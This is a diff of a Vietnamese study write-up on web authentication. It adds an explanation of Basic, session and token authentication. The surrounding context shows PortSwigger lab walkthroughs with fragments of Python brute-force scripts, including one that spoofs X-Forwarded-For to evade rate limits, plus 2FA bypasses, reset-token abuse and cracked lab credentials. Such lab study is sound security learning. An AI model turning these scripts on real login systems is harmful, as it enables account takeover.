@@ -5,6 +5,9 @@
 - **Khái niệm**
 
   - Authentication - xác thực là một hành động nhằm thiết lập hoặc chứng thực một cái gì đó (hoặc một người nào đó) đáng tin cậy, từ đó được cung cấp các quyền lợi, truy vấn tương ứng với vật / người đã được xác thực. Sau khi bạn được xác thực, hệ thống sẽ biết người đang sử dụng tài khoản / dịch vụ đó chính là bạn
+  - Vì thế bản chất của authentication ở đây chính là việc bạn xác nhận HTTP request được gửi từ một người nào đó.
+  - ![image](https://hackmd.io/_uploads/r1aSpxMcT.png)
+
   - Authorization - ủy quyền là một khái niệm sinh ra sau khi xác thực thành công, đây là giới hạn, quyền hạn sử dụng dịch vụ của một người dùng
   - Có ba loại xác thực chính:
 
@@ -27,7 +30,6 @@
   - Nếu kẻ tấn công bỏ qua xác thực hoặc đột nhập vào tài khoản của người dùng khác, chúng có quyền truy cập vào tất cả dữ liệu và chức năng mà tài khoản bị xâm phạm có. Nếu họ có thể xâm phạm tài khoản có đặc quyền cao, chẳng hạn như quản trị viên hệ thống, họ có thể có toàn quyền kiểm soát toàn bộ ứng dụng và có khả năng giành được quyền truy cập vào cơ sở hạ tầng nội bộ.
   - hầu hết các thông tin bạn lưu trên trang web đó đều bị lộ, đồng thời họ có thể sử dụng các tính năng của trang web với danh tính của bạn, mang lại hậu quả khó lường cho người dùng nói riêng và hệ thống nói chung.
 - **Phòng tránh**
-
   - **Về phía nhà cung cấp dịch vụ:**
   - Người dùng không cần biết quá nhiều thông tin không cần thiết
     - Ví dụ: Khi người dùng nhập sai tên đăng nhập hoặc mật khẩu, thông báo đưa ra tới người dùng chỉ nên có dạng "Tên đăng nhập hoặc mật khẩu không hợp lệ" - chỉ đủ cho người dùng biết họ đang nhập sai, không chỉ ra chính xác sai tên đăng nhập hoặc mật khẩu.
@@ -36,11 +38,122 @@
     - Khi phát hiện một người dùng thực hiện đăng nhập sai vượt quá số lần quy định, đó rất có thể là một cuộc tấn công Brute force. Hệ thống có thể thực hiện vô hiệu hóa tài khoản đó trong một thời gian nhất định. Và cứ mỗi lần người dùng tiếp tục đăng nhập thất bại, thời gian vô hiệu hóa đó sẽ càng tăng lên. Điều này thực sự mang lại hiệu quả lớn trong việc phòng chống tấn công vét cạn.
   - Xác thực nhiều bước
   - Sử dụng mã Capcha
-
   - **Về phía người dùng:**
     - Không nên sử dụng thông tin cá nhân đặt làm mật khẩu.
     - Không click vào các đường link lạ do người khác gửi.
     - Không điền thông tin vào các trang có dấu hiệu lừa đảo.
+
+Authentication được thực hiện như thế nào?
+Các bạn đã hiểu bản chất của authentication rồi, vậy thì nó sẽ được thực hiện như thế nào?
+
+Đối với một bức thư, cách để bạn biết thư được gửi đúng từ một người nào đó là chữ ký, nét chữ,... hay bất kể một dấu hiệu nào đó được thống nhất từ trước giữa 2 người.
+
+Quay trở lại với một HTTP request. Bản chất của HTTP request cũng là một bản tin biểu diễn bằng text. Do đó cũng sẽ cần một dấu hiệu nào đó được thống nhất để ứng dụng của chúng ta nhận ra nó xuất phát từ người dùng nào.
+
+![image](https://hackmd.io/_uploads/B1Nt0gGc6.png)
+
+- Một dấu hiệu nhận biết người dùng có thể là bất kỳ thứ gì mang tính đặc trưng, như tên đăng nhập, mật khẩu, một chuôĩ chứa thông tin được mã hóa, hay thậm chí là một chuỗi ký tự random.
+- Dấu hiệu nhận biết người dùng có thể ở bất kỳ vị trí nào có thể trong bản tin HTTP như: URL, Header (Cookie header, Authorization header, Custom header), Body (Form field,...)
+
+**Quá trình authentication**
+Để có được dấu hiệu nhận dạng phía trên, ta cần có sự thống nhất trước giữa người dùng và ứng dụng để ứng dụng của chúng ta có thể nhận dạng được người dùng. Một quá trình authentication sẽ bao gồm 3 phần:
+
+- **Sinh ra dấu hiệu:** Đây là việc chúng ta quyết định xem dùng dấu hiệu gì, tạo ra dấu hiệu đó như thế nào. Một quá trình authentication có thể có sự xuất hiện của nhiều dấu hiệu, ví dụ username/password, user token, api key,... Các dấu hiệu này sẽ có cách sinh ra khác nhau, quy ước sử dụng khác nhau.
+- **Lưu trữ dấu hiệu:** Đây là việc ứng dụng sẽ quyết định lưu trữ dấu hiệu này ở đâu, ở cả server và client, thông qua vị trí nào trên bản tin HTTP,...
+- **Kiểm tra dấu hiệu:** Đây là việc ứng dụng của chúng ta kiểm tra lại tính hợp lệ của dấu hiệu, đối chiếu xem dấu hiệu này là của người dùng nào,...
+
+![image](https://hackmd.io/_uploads/rJkny-G5a.png)
+
+Về cơ bản thì một quá trình authentication sẽ gồm 2 bước:
+
+- Xác thực một user (thường là request đầu tiên)
+- Lưu giữ đăng nhập (cho các request phía sau)
+
+**Basic Authentication**
+
+- Cách hoạt động của Basic Auth là gửi chính username + password của người dùng theo mỗi request.
+  - **Dấu hiệu:** Chuỗi `username:password` đã được mã hóa Base64. Ví dụ có username là abc, password là 123 thì ta tạo chuỗi mã hóa: `abc:123` --Base64--> `YWJjOjEyMw==`
+  - Lưu trữ dấu hiệu:
+    - Tại server: Máy chủ web sẽ lưu lại username, password trong database, file (htpasswd),...
+    - Tại client: Sau khi hỏi người dùng nhập username và password lần đầu, browser sẽ lưu lại 2 giá trị này trong bộ nhớ được quản lý bởi mỗi trình duyệt (và chúng ta không thể tiếp cận bộ nhớ này bằng code trên trang) để tránh phải liên tục hỏi chúng ta username, password. Tuy nhiên thời gian lưu thường là có giới hạn.
+  - **Truyền tải:** chuỗi đã mã hóa base64 phía trên sẽ được truyền trong HTTP request trong Authorization header với từ khóa Basic phía trước: `Authorization: Basic YWJjOjEyMw==`
+  - **Kiểm tra dấu hiệu:** Với mỗi request gửi lên kèm thông tin username/password trên, server sẽ so sánh username/password với database, config file,... để kiểm tra tính hợp lệ.
+  - **Flow của Basic Auth:**
+  - ![image](https://hackmd.io/_uploads/HJSIX4zqp.png)
+
+**ưu điểm:**
+
+- **Đơn giản**, do đó được hầu hết các trình duyệt, webserver (nginx, apache,...) hỗ trợ. Bạn có thể dễ dàng config cho webserver sử dụng Basic Auth với 1 vài dòng config.
+- **Dễ dàng kết hợp với các phương pháp khác**. Do đã được xử lý mặc định trên trình duyệt và webserver thông qua truyền tải http header, các bạn có thể dễ dàng kết hợp phương pháp này với các phương pháp sử dụng cookie, session, token,...
+
+**Nhược điểm:**
+
+- **Username/password** dễ bị lộ. Do mỗi request đều phải truyền username và password nên sẽ tăng khả năng bị lộ qua việc bắt request, log server,...
+- **Không thể logout**. Vì việc lưu username, password dưới trình duyệt được thực hiện tự động và không có sự can thiệp của chủ trang web. Do vậy không có cách nào logout được người dùng ngoại trừ việc tự xóa lịch sử duyệt web hoặc hết thời gian lưu của trình duyệt.
+
+Vì những đặc điểm trên, Basic Auth thường được sử dụng trong các ứng dụng nội bộ, các thư mục cấm như hệ thống CMS, môi trường development, database admin,... lợi dụng việc chặt chẽ của kiểm tra Basic Auth trên các web server để tránh tiết lộ thông tin hệ thống nội bộ cho người ngoài, phòng chống hack, khai thác lỗ hổng ứng dụng,...
+
+**Session-based Authentication**
+
+- Session-based authentication là cơ chế đăng nhập người dùng dựa trên việc tạo ra session của người dùng ở phía server. Sau quá trình xác thực người dùng thành công (username/password,...) thì phía server sẽ tạo và lưu ra một session chứa thông tin của người dùng đang đăng nhập và trả lại cho client session ID để truy cập session cho những request sau.
+  - **Dấu hiệu:** 1 chuỗi (thường là random) unique gọi là Session ID
+  - **Lưu trữ dấu hiệu:**
+    - Tại server: Lưu dữ liệu của session trong database, file, ram,... và dùng Session ID để tìm kiếm.
+    - Tại client: Lưu Session ID trong bộ nhớ cookie, hoặc URL trang web, form field ẩn,...
+  - **Truyền tải**: Session ID sẽ xuất hiện trong các HTTP request tiếp theo trong **Cookie** (header Cookie: SESSION_ID=abc), **URL** (/profile?session_id=abc), **body** (form field ẩn),...
+  - **Kiểm tra dấu hiệu**: Server dùng Session ID client truyền lên để tìm dữ liệu của session từ các nguồn lưu như database, file, ram,...
+- Quá trình set Session ID thường được thực hiện một cách tự động bởi server, cho nên session-based authentication thường sử dụng Cookie, vì cookie có thể set được từ phía server và được browser áp dụng tự động cho các request tiếp theo.
+- Flow của Session-based Authentication
+- ![image](https://hackmd.io/_uploads/HJeuwEMqa.png)
+  **Ưu điểm:**
+- **Thông tin được giấu kín:** Client chỉ được biết tới Session ID thường là 1 chuỗi random không mang thông tin gì của người dùng, còn mọi thông tin khác của phiên đăng nhập hay người dùng hiện tại đều được lưu phía server nên cơ chế này giữ kín được thông tin của người dùng trong quá trình truyền tải.
+- **Dung lượng truyền tải nhỏ**: Bởi vì tự thân Session ID không mang theo thông tin gì, thông thường chỉ là một chuỗi ký tự unique khoảng 20-50 ký tự, do vậy việc gắn Session ID vào mỗi request không làm tăng nhiều độ dài request, do đó việc truyền tải sẽ diễn ra dễ dàng hơn.
+- **Không cần tác động client:** Theo mình thì để sử dụng cơ chế session này bạn chủ yếu chỉ cần sửa phía server. Client mà cụ thể là browser hầu như không cần phải xử lý gì thêm bởi đã được tích hợp tự động (đối với cookie), hoặc response trả về của server đã có sẵn (đối với session ID ở URL hoặc hidden form)
+  **Nhược điểm:**
+- **Chiếm nhiều bộ nhớ:** Với mỗi phiên làm việc của user, server sẽ lại phải tạo ra một session và lưu vào bộ nhớ trên server. Số data này có thể còn lớn hơn cả user database của bạn do mỗi user có thể có vài session khác nhau. Do vậy việc tra cứu đối với các hệ thống lớn nhiều người dùng sẽ là vấn đề.
+- **Khó scale:** Vì tính chất stateful của việc lưu session data ở phía server, do đó bạn sẽ khó khăn hơn trong việc scale ngang ứng dụng, tức là nếu bạn chạy ứng dụng của bạn ở 10 máy chủ, hay 10 container, thì 1 là bạn phải dùng chung chỗ lưu session, 2 là nếu không dùng chung bộ nhớ session thì phải có giải pháp để ghi nhớ user đã kết nối tới server nào của bạn. Nếu không rất có thể chỉ cần ấn refresh thôi, user kết nối với server khác khi cân bằng tải là sẽ như chưa hề có cuộc login ngay.
+- **Phụ thuộc domain:** Vì thường sử dụng cookie, mà cookie lại phụ thuộc vào domain, do vậy khả năng sử dụng phiên đăng nhập của bạn sẽ bị giới hạn ở đúng domain được set cookie. Điều này không phù hợp với các hệ thống phân tán hoặc tích hợp vào ứng dụng bên thứ 3.
+- **CSRF**: Nói nôm na là Session ID thường được lưu vào Cookie, và cookie mới là thứ dễ bị tấn công kiểu này. Vì cookie được tự động gắn vào các request tới domain của bạn.
+
+Vì những đặc điểm trên, Session-based Authentication thường được dùng trong các website và những ứng dụng web làm việc **chủ yếu với browser**, những hệ thống **monolithic** do cần sự tập trung trong việc lưu session data và sự hạn chế về domain.
+
+**Token-based Authentication**
+
+- Token-based Authentication là cơ chế đăng nhập người dùng dựa trên việc tạo ra token - một chuỗi ký tự (thường được mã hóa) mang thông tin xác định người dùng được server tạo ra và lưu ở client. Server sau đó có thể không lưu lại token này.
+
+  - **Dấu hiệu:** 1 chuỗi chứa thông tin người dùng (thường được mã hóa và signed) gọi là token
+  - **Lưu trữ dấu hiệu:**
+    - Tại server: Thường là không cần lưu.
+    - Tại client: Ứng dụng client (javascript, mobile,...) phải tự lưu token trong các bộ nhớ ứng dụng, local storage, cookie,...
+  - **Truyền tải:** Token sẽ xuất hiện trong các HTTP request tiếp theo trong **Authorization header** (Authorization: Bearer abc), **Cookie** (header Cookie: token=abc), **URL** (/profile?token=abc), **body** (ajax body, field),...
+  - **Kiểm tra dấu hiệu:** Token thường có tính self-contained (như JWT), tức là có thể tự kiểm tra tính đúng đắn nhờ vào các thuật toán mã hóa và giải mã chỉ dựa vào thông tin trên token và 1 secret key nào đó của server. Do đó server không cần thiết phải lưu lại token, hay truy vấn thông tin user để xác nhận token.
+
+- Flow của Token-based Authentication:
+- ![image](https://hackmd.io/_uploads/S1WYgBG9T.png)
+
+**Ưu điểm:**
+
+- **Stateless:** Bởi vì token thường có tính chất self-contained, do vậy server không cần lưu thêm thông tin gì về token hay map giữa token và người dùng. Do vậy đây là tính chất quan trọng nhất, phục vụ cho việc scale ứng dụng theo chiều ngang khi không cần quan tâm tới việc bạn sẽ sinh ra token ở đâu và verify token ở đâu.
+- **Phù hợp với nhiều loại client:** Nên nhớ, cookie là một concept được các browser áp dụng tự động, còn với các client sử dụng Web API như mobile, IoT device, server,... thì việc sử dụng cookie lại rất hạn chế. Sử dụng token trong header hay URL,... sẽ dễ dàng hơn cho client trong việc lưu lại token và truyền tải token.
+- **Chống CSRF**: Do việc sử dụng token phải được client xử lý từ việc lưu tới truyền tải, do vậy sử dụng token (mà không dùng cookie) sẽ phòng chống được các trường hợp tấn công như với trường hợp session/cookie.
+- **Không bị giới hạn bởi domain**: Đây là tính chất giúp các hệ thống hiện đại có sự tham gia của bên thứ 3 hoạt động dễ dàng hơn khi không bị giới hạn chỉ ở domain của hệ thống đăng nhập.
+  **Nhược điểm:**
+- **Khó quản lý đăng xuất**: Bởi vì server không lưu thông tin gì về token hay session của user, do đó điều khó kiểm soát nhất chính là việc đăng xuất. Và vì việc kiểm tra token chỉ dựa vào thông tin trên token, do vậy sẽ khó để ứng dụng của chúng ta vô hiệu hóa một token vẫn còn hiệu lực.
+- **Phức tạp phần client:** Cơ chế sử dụng token thường yêu cầu client phải có xử lý liên quan tới lưu token, gửi token, do vậy sẽ không phù hợp với những website kiểu cũ, sử dụng nhiều server render html và phần javascript hạn chế
+- **Thông tin dễ lộ**: Khác với session, thông tin về phiên đăng nhập của người dùng có trên token và được lưu phía client, do vậy sẽ có các nguy cơ liên quan tới lộ thông tin trong token trong quá trình lưu trữ, truyền tải,... Chính vì vậy, thông thường người ta chỉ lưu 1 số thông tin thiết yếu như user_id, username mà không lưu những thông tin nhạy cảm như password vào token.
+- **Dung lượng truyền tải lớn**: Thường thì 1 token sẽ dài hơn session ID khá nhiều, mà token lại được gửi với mỗi request, do vậy độ dài request sẽ tăng lên, do đó băng thông truyền tải cũng sẽ cần phải tăng theo. Tuy nhiên, đây chỉ là một điểm hạn chế nhỏ so với những lợi ích nó mang lại.
+
+Vì các đặc điểm trên, Token-based Authentication thường được sử dụng trong các hệ thống Web API, các hệ thống phân tán, **micro-services**, các hệ thống có sự tham gia của các nền tảng khác như **mobile, IoT, server**,..., hoặc các website kiểu mới (phân tách rõ UI app và API).
+
+## Bảng so sánh
+
+| Đặc điểm    | Basic                            | Session-based                                     | Token-based                                              |
+| ----------- | -------------------------------- | ------------------------------------------------- | -------------------------------------------------------- |
+| Dấu hiệu    | Authorization Header             | Header (cookie) / URL / Body (form)               | Header (Auth, custom) / URL / Body                       |
+| Lưu Server  | Không lưu (vì chính là UserDB)   | Có lưu Session Data (memory, database, file,...)  | Không lưu (vì token chứa đủ thông tin rồi)               |
+| Lưu Client  | Browser tự lưu (username + pass) | Cookie (Session ID)                               | Local storage, Cookie, session storage (browser)         |
+| Cách verify | So sánh với UserDB               | Dùng Session ID để tìm data trong session storage | Kiểm tra tính toàn vẹn của token qua signature của token |
+| Phù hợp cho | Hệ thống internal                | Monolithic website                                | Web API của hệ thống phân tán, đa nền tảng,...           |
 
 ![image](https://hackmd.io/_uploads/Skl94gAYT.png)
 
@@ -90,13 +203,13 @@ Trong cột Lengh, xuất hiện dòng response với độ dài khác so với 
 
 trang đã chuyển hướng chúng ta đến tài khoản của người dùng có id = amarillo
 
-- Như vậy chúng ta đã tìm được ```username:password``` là ```amarillo:maggie```. Đăng nhập thôi!
+- Như vậy chúng ta đã tìm được ==username:password== là ==amarillo:maggie==. Đăng nhập thôi!
 
 ![image](https://hackmd.io/_uploads/By0uVZRYp.png)
 
 mình đã viết lại script khai thác:
 
-```python
+```python=
 #!/usr/bin/python3.7
 import requests
 import re
@@ -151,7 +264,7 @@ link: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-s
 
 Từ các dấu hiệu này có thể suy đoán rằng thực chất khi đăng nhập đúng tài khoản tại trang /login, chúng ta đã được xác thực thành công tại trang /login, còn trang /login2 giống như một thao tác phụ để xác thực mã code.
 
-- và chúng ta nhận thấy cookie ở 2 trang ```/login``` và ```/login2``` là khác nhau
+- và chúng ta nhận thấy cookie ở 2 trang ==/login== và ==/login2== là khác nhau
 
 ![image](https://hackmd.io/_uploads/HkDhoX0Ka.png)
 
@@ -161,7 +274,7 @@ Thật vậy, trước khi điền mã 2FA, thay đổi URL dẫn tới trang c�
 
 ### Khai thác
 
-- Như vậy, chúng ta có thể trực tiếp sửa URL thành /my-account?id=carlos sau khi đăng nhập ```carlos:montoya``` tại trang /login
+- Như vậy, chúng ta có thể trực tiếp sửa URL thành /my-account?id=carlos sau khi đăng nhập ==carlos:montoya== tại trang /login
 
 ![image](https://hackmd.io/_uploads/SyhJDXCY6.png)
 
@@ -169,7 +282,7 @@ vậy là chúng ta đã vượt qua lớp xác thực còn lại
 
 mình đã viết lại script khai thác
 
-```python
+```python=
 #!/usr/bin/python3.7
 import requests
 import re
@@ -234,7 +347,7 @@ Truy cập link đặt lại mật khẩu, quan sát request qua Burp Suite:
 
 ![image](https://hackmd.io/_uploads/SkBUnSCta.png)
 
-- Chúng ta thấy tại request này, client đã gửi tới server các giá trị ```temp-forgot-password-token, username, new-password-1, new-password-2``` qua phương thức POST.
+- Chúng ta thấy tại request này, client đã gửi tới server các giá trị ==temp-forgot-password-token, username, new-password-1, new-password-2== qua phương thức POST.
 
 - Từ các tham số này, chúng ta có thể dự đoán hệ thống xác thực yêu cầu đặt lại mật khẩu bằng tham số temp-forgot-password-token (token được gửi cho tài khoản mail yêu cầu đặt lại mật khẩu) và xác thực danh tính người dùng cần đặt lại mật khẩu qua tham số username, sau đó hai tham số new-password-1 và new-password-2 tương ứng là mật khẩu mới và xác nhận mật khẩu mới.
 
@@ -244,7 +357,7 @@ Truy cập link đặt lại mật khẩu, quan sát request qua Burp Suite:
 
 ![image](https://hackmd.io/_uploads/r11nV8AK6.png)
 
-mình đăng nhập tài khoản ```carlos:123``` và giải quyết được lab này
+mình đăng nhập tài khoản ==carlos:123== và giải quyết được lab này
 
 ![image](https://hackmd.io/_uploads/HkBRN80Y6.png)
 
@@ -276,7 +389,7 @@ Lúc này, chúng ta cần có thao tác tự động hóa việc nhận biết 
 
 ![image](https://hackmd.io/_uploads/B13UJoCYa.png)
 
-Bắt đầu tấn công thôi nào! Sau khi kết thúc, sắp xếp lại cột warining nhận thấy request 91 trả về dòng thông báo `Invalid username or password`khác với các dòng thông báo khác (Thiếu dấu . đây là sự bất cẩn của người lập trình). Như vậy chúng ta thu được username của victim là ```americas```
+Bắt đầu tấn công thôi nào! Sau khi kết thúc, sắp xếp lại cột warining nhận thấy request 91 trả về dòng thông báo `Invalid username or password`khác với các dòng thông báo khác (Thiếu dấu . đây là sự bất cẩn của người lập trình). Như vậy chúng ta thu được username của victim là ==americas==
 
 ![image](https://hackmd.io/_uploads/r1ZVej0Ya.png)
 
@@ -286,7 +399,7 @@ Thực hiện tấn công tương tự với danh sách passwords được cung 
 
 ![image](https://hackmd.io/_uploads/By0ixjCYa.png)
 
-Như vậy chúng ta có tài khoản victim là ```americas:qazwsx``` mình đăng nhập và hoàn thành lab.
+Như vậy chúng ta có tài khoản victim là ==americas:qazwsx== mình đăng nhập và hoàn thành lab.
 
 ![image](https://hackmd.io/_uploads/SkcNWiAY6.png)
 
@@ -311,7 +424,7 @@ link: https://portswigger.net/web-security/authentication/password-based/lab-use
 
 VD:
 
-```php
+```php=
 $connect = mysqli_connect ('localhost', 'root', '', 'user');
 
 $username = $_POST['username'];
@@ -321,7 +434,7 @@ $query = "SELECT * FROM users WHERE username = '$username'";
 $result = mysqli_query($connect, $query);
 $count = mysqli_num_rows($result);
 
-if ($count ``` 1) {
+if ($count == 1) {
     $row = mysqli_fetch_array($result);
     if (md5($password) != $row['password']) {
         echo "Invalid username or password!";
@@ -381,21 +494,21 @@ Quan sát cột giá trị Response received và Response completed thấy reque
 
 ![image](https://hackmd.io/_uploads/H1wQSex5p.png)
 
-- Điều này chứng tỏ username cần tìm là ```alerts```. Tiếp tục thực hiện như trên với danh sách passwords.
+- Điều này chứng tỏ username cần tìm là ==alerts==. Tiếp tục thực hiện như trên với danh sách passwords.
 
 ![image](https://hackmd.io/_uploads/B1dvIexc6.png)
 
 Khi cuộc tấn công kết thúc, hãy tìm phản hồi kèm theo 302 trạng thái. Hãy ghi lại mật khẩu này.
 
-- chúng ta thu được tài khoản hợp lệ là ```alerts:cheese```. Đăng nhập và giải quyết lab:
+- chúng ta thu được tài khoản hợp lệ là ==alerts:cheese==. Đăng nhập và giải quyết lab:
 
 ![image](https://hackmd.io/_uploads/rkA68gxcT.png)
 
 mình đã làm lại lab này và viết mã khai thác
 
-mình thấy thấy ```wiener: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa``` status 302 response time xấp xỉ 3000 milliseconds
+mình thấy thấy ==wiener: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa== status 302 response time xấp xỉ 3000 milliseconds
 
-```python
+```python=
 import requests
 import time
 url = 'https://0a73009803ee1c1c813a3eae00b20033.web-security-academy.net/login'
@@ -415,7 +528,7 @@ password = file_password.readline().strip()
 # print(password)
 for i in range(101):
     response = requests.post(url,data={'username': username, 'password': password}, allow_redirects= False,headers={'X-Forwarded-For': '118.71.204.'+ str(i)})
-    if(response.status_code ``` 302):
+    if(response.status_code == 302):
         print("Mật khẩu là:" + password)
         break
     password = file_password.readline().strip()
@@ -423,7 +536,7 @@ for i in range(101):
 
 ![image](https://hackmd.io/_uploads/BJu1GZlqa.png)
 
-và được tài khoản là ```am:666666``` đồng thời chúng ta cũng đã giải được lab này
+và được tài khoản là ==am:666666== đồng thời chúng ta cũng đã giải được lab này
 
 ![image](https://hackmd.io/_uploads/rktu-bgcT.png)
 
@@ -496,7 +609,7 @@ mình đã viết mã khai thác cho bài này
 
 - với tạo file tài khoản mình sẽ tạo cho khi đăng nhập 1 lần trong list password sẽ đăng nhập tài khoản đúng `wiener:peter`
 
-```python
+```python=
 usrname = open('./username.txt', 'r')
 new_usrname = open('new_username.txt', 'w')
 for word in usrname:
@@ -512,7 +625,7 @@ for word in passwds:
 
 - mã khai thác
 
-```python
+```python=
 import requests
 import time
 url = 'https://0a44004c044170bb8161307e00f2001a.web-security-academy.net/login'
@@ -524,7 +637,7 @@ password = file_password.readline().strip()
 
 for i in range(101):
     response = requests.post(url,data={'username': username, 'password': password}, allow_redirects= False,)
-    if(username != "wiener" and response.status_code ``` 302 ):
+    if(username != "wiener" and response.status_code == 302 ):
         print("Mật khẩu của carlos là: " + password)
         break
     password = file_password.readline().strip()
@@ -533,8 +646,8 @@ for i in range(101):
 
 ![image](https://hackmd.io/_uploads/SyRU0tgcT.png)
 
-mình nhận được mật khẩu là ```football```
-mình đăng nhập tài khoản ```carlos:football``` và giải được lab này
+mình nhận được mật khẩu là ==football==
+mình đăng nhập tài khoản ==carlos:football== và giải được lab này
 
 ![image](https://hackmd.io/_uploads/SkwXAKg56.png)
 
@@ -570,7 +683,7 @@ Username app bị khóa, suy ra đây là một tên đăng nhập hợp lệ. T
 
 mình đã viết lại mã khai thác
 
-```python
+```python=
 import requests
 from tqdm import tqdm
 url = 'https://0aee0016044a70e5814e4ed300320023.web-security-academy.net/login'
@@ -612,7 +725,7 @@ for password in tqdm(passwords):
 
 ![image](https://hackmd.io/_uploads/B1nI-jeqp.png)
 
-mình được tài khoản là ```app:monkey``` và đăng nhập và giải quyết được bài lab
+mình được tài khoản là ==app:monkey== và đăng nhập và giải quyết được bài lab
 
 ## 8. Lab: 2FA broken logic
 
@@ -692,10 +805,10 @@ Chức năng này thường được người dùng lựa chọn sử dụng ho�
 
 ![image](https://hackmd.io/_uploads/r1B-1BZ5T.png)
 
-Hệ thống xác nhận việc ghi nhớ đăng nhập bằng giá trị cookie: ```d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhN```
+Hệ thống xác nhận việc ghi nhớ đăng nhập bằng giá trị cookie: ==d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhN==
 
 mình dùng cyberchef và chọn kiểu **magic** để tự động decode
-và thấy nó decode base64 được ```wiener:51dc30ddc473d43a6011e9ebba6ca770```
+và thấy nó decode base64 được ==wiener:51dc30ddc473d43a6011e9ebba6ca770==
 
 ![ảnh](https://hackmd.io/_uploads/SJXuq4b9p.png)
 
@@ -703,7 +816,7 @@ và thấy nó decode base64 được ```wiener:51dc30ddc473d43a6011e9ebba6ca770
 
 - và burp suite cũng tự decode cho chúng ta ở bên trái
 
-mình đoán ```51dc30ddc473d43a6011e9ebba6ca770``` khả năng lớn là mật khẩu của `wiener` sau khi được mã hóa bằng cách nào đó. Lúc này, dùng trang web này sẽ không tìm ra cách mã hóa nữa
+mình đoán ==51dc30ddc473d43a6011e9ebba6ca770== khả năng lớn là mật khẩu của `wiener` sau khi được mã hóa bằng cách nào đó. Lúc này, dùng trang web này sẽ không tìm ra cách mã hóa nữa
 
 - Quan sát các kí tự tạo thành: được tạo thành từ các chữ số 0-9 và các chữ cái thường từ a đến e.
 - Độ dài bằng đúng 32 kí tự
@@ -782,16 +895,16 @@ và sau đó vào phần access log để xem log của server và chúng ta th�
 
 ![image](https://hackmd.io/_uploads/S1MWcSWcp.png)
 
-ở phần stay-log-in có giá trị: ```Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz```  
+ở phần stay-log-in có giá trị: ==Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz==  
 ![image](https://hackmd.io/_uploads/H1nG5BZ9T.png)
 
 và mình đem decode base64 được giá trị
-```carlos:26323c16d5f4dabff3bb136f2460a943```
+==carlos:26323c16d5f4dabff3bb136f2460a943==
 đêm mật khẩu crack trên trang web crackstation
 
 ![image](https://hackmd.io/_uploads/SJ0DqBZq6.png)
 
-và mình có tài khoản của người dùng là ```carlos:onceuponatime```
+và mình có tài khoản của người dùng là ==carlos:onceuponatime==
 
 sau đó minhf đăng nhập vào tài khoản và xóa đi tài khoản này
 
@@ -852,7 +965,7 @@ Thêm header X-Forwarded-Host và đặt lại mật khẩu "giúp" carlos:
 
 ![image](https://hackmd.io/_uploads/B1pGjAWcp.png)
 
-```temp-forgot-password-token=fjxb3gxl61ivtbdnu548mosc5a6bszu9```
+==temp-forgot-password-token=fjxb3gxl61ivtbdnu548mosc5a6bszu9==
 
 Bây giờ có thể dễ dàng cập nhật mật khẩu của carlos:
 
@@ -909,7 +1022,7 @@ mình nhận được warning `new password do not match` khi nhập mật khẩ
 
 ![image](https://hackmd.io/_uploads/HkSQyJGcp.png)
 
-vậy chúng ta có tài khoản ```carlos:computer``` và đăng nhập chúng ta đã giải quyết được bài lab này
+vậy chúng ta có tài khoản ==carlos:computer== và đăng nhập chúng ta đã giải quyết được bài lab này
 
 ![image](https://hackmd.io/_uploads/SyejJJzca.png)
 
@@ -939,7 +1052,7 @@ Tên đăng nhập và mật khẩu được gửi tới hệ thống theo đị
 
 ### Khai thác
 
-```python
+```python=
 passwds = open('./password.txt', 'r').read().splitlines()
 s = ""
 for a in passwds:
